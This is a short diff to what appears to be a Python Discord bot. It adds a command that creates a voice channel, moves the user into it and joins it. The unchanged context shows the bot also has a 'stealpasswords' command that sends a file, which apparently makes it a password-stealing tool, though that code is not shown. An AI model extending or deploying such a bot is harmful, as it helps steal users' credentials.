@@ -107,9 +107,27 @@ async def stealpasswords(ctx):
     except Exception as e:
         await ctx.send(f"Failed to send file: {e}")
 
+  
+async def join(ctx):
+    guild = ctx.guild
+    author = ctx.author
 
+    category = ctx.channel.category
+    channel_name = f"{author.name}'s VC"
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(connect=True, view_channel=True)
+    }
+
+    voice_channel = await guild.create_voice_channel(channel_name, overwrites=overwrites, category=category)
+    
+    
+    if author.voice:
+        await author.move_to(voice_channel)
 
     
+    await voice_channel.connect()
+
+    await ctx.send(f"✅ Created and joined voice channel: **{channel_name}**")
 
 
 bot.run(TOKEN)
